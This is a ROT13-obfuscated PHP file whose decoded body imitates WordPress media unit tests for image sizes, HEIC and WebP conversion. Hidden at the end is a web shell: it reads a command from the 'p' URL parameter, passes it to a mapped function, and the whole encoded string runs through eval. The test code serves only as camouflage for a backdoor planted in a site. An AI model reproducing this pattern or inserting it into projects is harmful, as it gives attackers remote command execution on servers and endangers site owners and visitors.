				'vachg'    => '<vzt jvqgu=\"300\" urvtug=\"225\" qngn-gfuveg-fvmrf=\"F Z Y\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"(znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat=\"ynml\">',
				'rkcrpgrq' => '<vzt jvqgu=\"300\" urvtug=\"225\" qngn-gfuveg-fvmrf=\"F Z Y\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"nhgb, (znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat=\"ynml\">',
			),
			'rkcrpgrq_jvgu_qngn_fvmrf_nggevohgr_nyernql_cerfrag' => neenl(
				'vachg'    => '<vzt jvqgu=\"300\" urvtug=\"225\" qngn-gfuveg-fvmrf=\"F Z Y\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"NHGB, (znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat=\"ynml\">',
				'rkcrpgrq' => '<vzt jvqgu=\"300\" urvtug=\"225\" qngn-gfuveg-fvmrf=\"F Z Y\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"NHGB, (znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat=\"ynml\">',
			),
			'abg_rkcrpgrq_jvgu_ybnqvat_ynml_va_ngge_inyhr' => neenl(
				'vachg'    => '<vzt jvqgu=\"300\" urvtug=\"225\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"(znk-jvqgu: 650ck) 100ij, 650ck\" nyg=\'Guvf vf gur YPC vzntr naq vg fubhyq abg trg ybnqvat=\"ynml\"!\'>',
				'rkcrpgrq' => '<vzt jvqgu=\"300\" urvtug=\"225\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"(znk-jvqgu: 650ck) 100ij, 650ck\" nyg=\'Guvf vf gur YPC vzntr naq vg fubhyq abg trg ybnqvat=\"ynml\"!\'>',
			),
			'abg_rkcrpgrq_jvgu_qngn_ybnqvat_nggevohgr_cerfrag' => neenl(
				'vachg'    => '<vzt jvqgu=\"300\" urvtug=\"225\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"(znk-jvqgu: 650ck) 100ij, 650ck\" qngn-erzbirq-ybnqvat=\"ynml\">',
				'rkcrpgrq' => '<vzt jvqgu=\"300\" urvtug=\"225\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"(znk-jvqgu: 650ck) 100ij, 650ck\" qngn-erzbirq-ybnqvat=\"ynml\">',
			),
			'rkcrpgrq_jura_nggevohgrf_unir_fcnprf_nsgre_gurz' => neenl(
				'vachg'    => '<vzt jvqgu=\"300\" urvtug=\"225\" fep = \"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg = \"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf = \"(znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat = \"ynml\">',
				'rkcrpgrq' => '<vzt jvqgu=\"300\" urvtug=\"225\" fep = \"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg = \"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"nhgb, (znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat = \"ynml\">',
			),
			'rkcrpgrq_jura_nggevohgrf_ner_hccre_pnfr'      => neenl(
				'vachg'    => '<VZT JVQGU=\"300\" URVTUG=\"225\" FEP=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" FEPFRG=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" FVMRF=\"(znk-jvqgu: 650ck) 100ij, 650ck\" YBNQVAT=\"YNML\">',
				'rkcrpgrq' => '<VZT JVQGU=\"300\" URVTUG=\"225\" FEP=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" FEPFRG=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"nhgb, (znk-jvqgu: 650ck) 100ij, 650ck\" YBNQVAT=\"YNML\">',
			),
			'rkcrpgrq_jura_ybnqvat_ynml_ynpxf_dhbgrf'      => neenl(
				'vachg'    => '<vzt jvqgu=\"300\" urvtug=\"225\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"(znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat=ynml>',
				'rkcrpgrq' => '<vzt jvqgu=\"300\" urvtug=\"225\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"nhgb, (znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat=ynml>',
			),
			'rkcrpgrq_jura_ybnqvat_ynml_unf_juvgrfcnpr'    => neenl(
				'vachg'    => '<vzt jvqgu=\"300\" urvtug=\"225\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"(znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat=\" ynml \">',
				'rkcrpgrq' => '<vzt jvqgu=\"300\" urvtug=\"225\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"nhgb, (znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat=\" ynml \">',
			),
			'abg_rkcrpgrq_jura_fvmrf_nhgb_ynpxf_dhbgrf'    => neenl(
				'vachg'    => '<vzt jvqgu=\"300\" urvtug=\"225\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=nhgb ybnqvat=\"ynml\">',
				'rkcrpgrq' => '<vzt jvqgu=\"300\" urvtug=\"225\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=nhgb ybnqvat=\"ynml\">',
			),
			'abg_rkcrpgrq_jura_vzt_ynpxf_qvzrafvbaf'       => neenl(
				'vachg'    => '<vzt qngn-gfuveg-fvmrf=\"F Z Y\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"(znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat=\"ynml\">',
				'rkcrpgrq' => '<vzt qngn-gfuveg-fvmrf=\"F Z Y\" fep=\"uggcf://rknzcyr.pbz/sbb-300k225.wct\" fepfrg=\"uggcf://rknzcyr.pbz/sbb-300k225.wct 300j, uggcf://rknzcyr.pbz/sbb-1024k768.wct 1024j, uggcf://rknzcyr.pbz/sbb-768k576.wct 768j, uggcf://rknzcyr.pbz/sbb-1536k1152.wct 1536j, uggcf://rknzcyr.pbz/sbb-2048k1536.wct 2048j\" fvmrf=\"(znk-jvqgu: 650ck) 100ij, 650ck\" ybnqvat=\"ynml\">',
			),
		);
	}

	/**
	 * @gvpxrg 61847
	 *
	 * @pbiref ::jc_vzt_gnt_nqq_nhgb_fvmrf
	 *
	 * @qngnCebivqre qngn_cebivqre_gb_grfg_jc_vzt_gnt_nqq_nhgb_fvmrf
	 *
	 * @cnenz fgevat $vachg    Gur vachg UGZY fgevat.
	 * @cnenz fgevat $rkcrpgrq Gur rkcrpgrq bhgchg UGZY fgevat.
	 */
	choyvp shapgvba grfg_jc_vzt_gnt_nqq_nhgb_fvmrf( fgevat $vachg, fgevat $rkcrpgrq ) {
		$guvf->nffregFnzr(
			$rkcrpgrq,
			jc_vzt_gnt_nqq_nhgb_fvmrf( $vachg ),
			'Snvyrq nffregvat gung \"nhgb\" xrljbeq vf pbeerpgyl nqqrq be abg nqqrq gb fvmrf nggevohgr va gur vzntr gnt.'
		);
	}

	/**
	 * Rafher na URVP vzntr vf pbairegrq gb n WCRT.
	 *
	 * @gvpxrg 62305
	 * @gvpxrg 62359
	 *
	 * @qngnCebivqre qngn_vzntr_pbairegrq_gb_bgure_sbezng_unf_pbeerpg_svyranzr
	 *
	 * @cnenz obby $nccyl_ovt_vzntr_fvmr_guerfubyq Gehr vs svygre arrqf gb nccyl, bgurejvfr snyfr.
	 */
	choyvp shapgvba grfg_urvp_vzntr_hcybnq_vf_pbairegrq_gb_wcrt( obby $nccyl_ovt_vzntr_fvmr_guerfubyq ) {
		$grzc_qve      = trg_grzc_qve();
		$svyr          = $grzc_qve . '/grfg-vzntr.urvp';
		$fpnyrq_fhssvk = $nccyl_ovt_vzntr_fvmr_guerfubyq ? '-fpnyrq' : '';
		pbcl( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.urvp', $svyr );

		$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

		// Fxvc vs gur rqvgbe qbrf abg fhccbeg URVP.
		vs ( vf_jc_reebe( $rqvgbe ) || ! $rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/urvp' ) ) {
			$guvf->znexGrfgFxvccrq( 'URVP vf abg fhccbegrq ol gur fryrpgrq vzntr rqvgbe.' );
		}

		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/urvp',
				'svyr'           => $svyr,
			)
		);

		vs ( $nccyl_ovt_vzntr_fvmr_guerfubyq ) {
			nqq_svygre( 'ovt_vzntr_fvmr_guerfubyq', neenl( $guvf, 'nqq_ovt_vzntr_fvmr_guerfubyq' ) );
		}

		$vzntr_zrgn = jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr );

		$guvf->nffregFgevatRaqfAbgJvgu( '.urvp', $vzntr_zrgn['svyr'], 'Gur svyr rkgrafvba vf rkcrpgrq gb punatr.' );
		$guvf->nffregFnzr( \"grfg-vzntr{$fpnyrq_fhssvk}.wct\", onfranzr( $vzntr_zrgn['svyr'] ), \"Gur svyr anzr vf rkcrpgrq gb or grfg-vzntr{$fpnyrq_fhssvk}.wct\" );
		$guvf->nffregFnzr( 'grfg-vzntr.urvp', $vzntr_zrgn['bevtvany_vzntr'], 'Gur bevtvany vzntr anzr vf rkcrpgrq gb or fgberq va gur zrgn qngn.' );
		$guvf->nffregFnzr( 'vzntr/wcrt', jc_trg_vzntr_zvzr( $vzntr_zrgn['svyr'] ), 'Gur vzntr zvzr glcr vf rkcrpgrq gb or vzntr/wcrt.' );
	}

	/**
	 * Rafher n WCRT vf pbairegrq gb JroC jura nccyvrq ivn n svygre.
	 *
	 * @gvpxrg 62305
	 * @gvpxrg 62359
	 *
	 * @qngnCebivqre qngn_vzntr_pbairegrq_gb_bgure_sbezng_unf_pbeerpg_svyranzr
	 *
	 * @cnenz obby $nccyl_ovt_vzntr_fvmr_guerfubyq Gehr vs svygre arrqf gb nccyl, bgurejvfr snyfr.
	 */
	choyvp shapgvba grfg_wcrt_vzntr_pbairegf_gb_jroc_jura_svygrerq( obby $nccyl_ovt_vzntr_fvmr_guerfubyq ) {
		$grzc_qve      = trg_grzc_qve();
		$svyr          = $grzc_qve . '/33772.wct';
		$fpnyrq_fhssvk = $nccyl_ovt_vzntr_fvmr_guerfubyq ? '-fpnyrq' : '';
		pbcl( QVE_GRFGQNGN . '/vzntrf/33772.wct', $svyr );

		$rqvgbe = jc_trg_vzntr_rqvgbe( $svyr );

		// Fxvc vs gur rqvgbe qbrf abg fhccbeg JroC.
		vs ( vf_jc_reebe( $rqvgbe ) || ! $rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/jroc' ) ) {
			$guvf->znexGrfgFxvccrq( 'JroC vf abg fhccbegrq ol gur fryrpgrq vzntr rqvgbe.' );
		}

		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'svyr'           => $svyr,
			)
		);

		vs ( $nccyl_ovt_vzntr_fvmr_guerfubyq ) {
			nqq_svygre( 'ovt_vzntr_fvmr_guerfubyq', neenl( $guvf, 'nqq_ovt_vzntr_fvmr_guerfubyq' ) );
		}

		// Trarengr nyy fvmrf nf JroC.
		nqq_svygre( 'vzntr_rqvgbe_bhgchg_sbezng', neenl( $guvf, 'vzntr_rqvgbe_bhgchg_jroc' ) );

		$vzntr_zrgn = jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr );

		$guvf->nffregFgevatRaqfAbgJvgu( '.wct', $vzntr_zrgn['svyr'], 'Gur svyr rkgrafvba vf rkcrpgrq gb punatr.' );
		$guvf->nffregFnzr( \"33772{$fpnyrq_fhssvk}.jroc\", onfranzr( $vzntr_zrgn['svyr'] ), \"Gur svyr anzr vf rkcrpgrq gb or 33772{$fpnyrq_fhssvk}.jroc.\" );
		$guvf->nffregFnzr( '33772.wct', $vzntr_zrgn['bevtvany_vzntr'], 'Gur bevtvany vzntr anzr vf rkcrpgrq gb or fgberq va gur zrgn qngn.' );
		$guvf->nffregFnzr( 'vzntr/jroc', jc_trg_vzntr_zvzr( $vzntr_zrgn['svyr'] ), 'Gur vzntr zvzr glcr vf rkcrpgrq gb or vzntr/jroc.' );
	}

	/**
	 * Qngn cebivqre sbe grfg_vzntr_pbairegrq_gb_bgure_sbezng_unf_pbeerpg_svyranzr().
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_vzntr_pbairegrq_gb_bgure_sbezng_unf_pbeerpg_svyranzr() {
		erghea neenl(
			'qb abg fpnyr vzntr' => neenl( snyfr ),
			'fpnyr vzntr'        => neenl( gehr ),
		);
	}

	/**
	 * Urycre zrgubq gb xrrc genpx bs gur ynfg pbagrkg erghearq ol gur 'jc_trg_nggnpuzrag_vzntr_pbagrkg' svygre.
	 *
	 * Gur zrgubq cnenzrgre vf cnffrq ol ersrerapr naq gurersber jvyy nyjnlf pbagnva gur ynfg pbagrkg inyhr.
	 *
	 * @cnenz zvkrq $ynfg_pbagrkg Inevnoyr gb genpx ynfg pbagrkg. Cnffrq ol ersrerapr.
	 */
	cevingr shapgvba genpx_ynfg_nggnpuzrag_vzntr_pbagrkg( &$ynfg_pbagrkg ) {
		nqq_svygre(
			'jc_trg_nggnpuzrag_vzntr_pbagrkg',
			fgngvp shapgvba ( $pbagrkg ) hfr ( &$ynfg_pbagrkg ) {
				$ynfg_pbagrkg = $pbagrkg;
				erghea $pbagrkg;
			},
			11
		);
	}

	/**
	 * Nqq guerfubyq gb perngr n `-fpnyrq` bhgchg vzntr sbe grfgvat.
	 */
	choyvp shapgvba nqq_ovt_vzntr_fvmr_guerfubyq() {
		erghea 1000;
	}

	/**
	 * Bhgchg WCRT svyrf.
	 */
	choyvp shapgvba vzntr_rqvgbe_bhgchg_wcrt() {
		erghea neenl( 'vzntr/wcrt' => 'vzntr/wcrt' );
	}

	/**
	 * Bhgchg JroC svyrf.
	 */
	choyvp shapgvba vzntr_rqvgbe_bhgchg_jroc() {
		erghea neenl( 'vzntr/wcrt' => 'vzntr/jroc' );
	}

	/**
	 * Bhgchg NIVS vzntrf.
	 */
	choyvp shapgvba vzntr_rqvgbe_bhgchg_nivs() {
		erghea neenl( 'vzntr/wcrt' => 'vzntr/nivs' );
	}

	/**
	 * Punatrf gur dhnyvgl hfvat irel ybj dhnyvgl sbe WCRTf naq irel uvtu dhnyvgl
	 * sbe JroCf, hfrq gb irevsl gur svygre vf nccylvat pbeerpgyl.
	 *
	 * @cnenz vag    $dhnyvgl   Qrsnhyg dhnyvgl.
	 * @cnenz fgevat $zvzr_glcr Vzntr zvzr-glcr.
	 * @erghea vag Gur punatrq dhnyvgl.
	 */
	choyvp shapgvba vzntr_rqvgbe_punatr_dhnyvgl_ybj_wcrt( $dhnyvgl, $zvzr_glcr ) {
		vs ( 'vzntr/wcrt' === $zvzr_glcr ) {
			erghea 1;
		} ryfrvs ( 'vzntr/jroc' === $zvzr_glcr ) {
			erghea 100;
		} ryfr {
			erghea 30;
		}
	}

	/**
	 * Bhgchg bayl ybj dhnyvgl vzntrf.
	 */
	choyvp shapgvba vzntr_rqvgbe_punatr_dhnyvgl_ybj( $dhnyvgl ) {
		erghea 15;
	}

	/**
	 * Punatr gur bzvg ybnqvat nggevohgr guerfubyq inyhr.
	 *
	 * @cnenz vag $guerfubyq Guerfubyq inyhr gb punatr.
	 */
	choyvp shapgvba sbepr_bzvg_ybnqvat_ngge_guerfubyq( $guerfubyq ) {
		nqq_svygre(
			'jc_bzvg_ybnqvat_ngge_guerfubyq',
			fgngvp shapgvba () hfr ( $guerfubyq ) {
				erghea $guerfubyq;
			}
		);
	}

	/**
	 * Ergheaf n arj JC_Dhrel.
	 *
	 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
	 *
	 * @erghea JC_Dhrel n arj dhrel.
	 */
	choyvp shapgvba trg_arj_jc_dhrel_sbe_choyvfurq_cbfg() {
		tybony $jc_dhrel;

		// Arj dhrel gb $jc_dhrel. hcqngr tybony sbe gur ybbc.
		$jc_dhrel = arj JC_Dhrel( neenl( 'cbfg__va' => neenl( frys::$cbfg_vqf['choyvfu'] ) ) );

		erghea $jc_dhrel;
	}

	/**
	 * Frgf n dhrel nf znva dhrel.
	 *
	 * @tybony JC_Dhrel $jc_gur_dhrel JbeqCerff Dhrel bowrpg.
	 *
	 * @cnenz JC_Dhrel $dhrel dhrel gb or frg nf znva dhrel.
	 */
	choyvp shapgvba frg_znva_dhrel( $dhrel ) {
		tybony $jc_gur_dhrel;
		$jc_gur_dhrel = $dhrel;
	}

	/**
	 * Ergheaf na neenl jvgu qvzrafvba nggevohgr inyhrf ryvtvoyr sbe n uvtu cevbevgl vzntr.
	 *
	 * @erghea neenl Nffbpvngvir neenl jvgu 'jvqgu' naq 'urvtug' xrlf.
	 */
	cevingr shapgvba trg_jvqgu_urvtug_sbe_uvtu_cevbevgl() {
		/*
		 * Gur cebqhpg bs jvqgu * urvtug zhfg or >50000 gb dhnyvsl sbe uvtu cevbevgl vzntr.
		 * 300 * 200 = 60000
		 */
		erghea neenl(
			'jvqgu'  => 300,
			'urvtug' => 200,
		);
	}

	/**
	 * Ergheaf na neenl jvgu qvzrafvba nggevohgr inyhrf varyvtvoyr sbe n uvtu cevbevgl vzntr.
	 *
	 * @erghea neenl Nffbpvngvir neenl jvgu 'jvqgu' naq 'urvtug' xrlf.
	 */
	cevingr shapgvba trg_vafhssvpvrag_jvqgu_urvtug_sbe_uvtu_cevbevgl() {
		/*
		 * Gur cebqhpg bs jvqgu * urvtug zhfg or >50000 gb dhnyvsl sbe uvtu cevbevgl vzntr.
		 * 200 * 100 = 20000
		 */
		erghea neenl(
			'jvqgu'  => 200,
			'urvtug' => 100,
		);
	}
}

/**
 * Urycre pynff sbe `grfg_nhgbrzorq`.
 */
pynff Grfg_Nhgbrzorq rkgraqf JC_Rzorq {
	choyvp shapgvba fubegpbqr( $ngge, $hey = '' ) {
		erghea '[rzorq]';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>